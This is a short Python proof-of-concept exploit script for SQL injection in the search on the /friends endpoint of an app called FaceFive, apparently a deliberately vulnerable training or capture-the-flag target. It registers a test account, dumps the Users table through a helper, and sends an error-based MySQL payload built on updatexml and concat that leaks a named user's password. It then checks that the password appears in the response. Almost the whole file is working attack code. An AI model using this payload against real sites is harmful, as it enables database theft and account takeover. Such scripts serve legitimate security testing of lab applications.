# vuln8.py

# PoC for SQL injection on the /friends endpoint
#
# The search bar allows for SQL injections which allow to read the entire DB

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'

reset_image(session)
register(session, user, passwd)

user_1, password = select_query(session, 'Users', 'username', 'password')[0]

r = create_post(session, '\' or updatexml(0,concat(0x7e,(select password from Users where username = \'{}\')),0) or \' '.format(user_1))
assert password in r.text
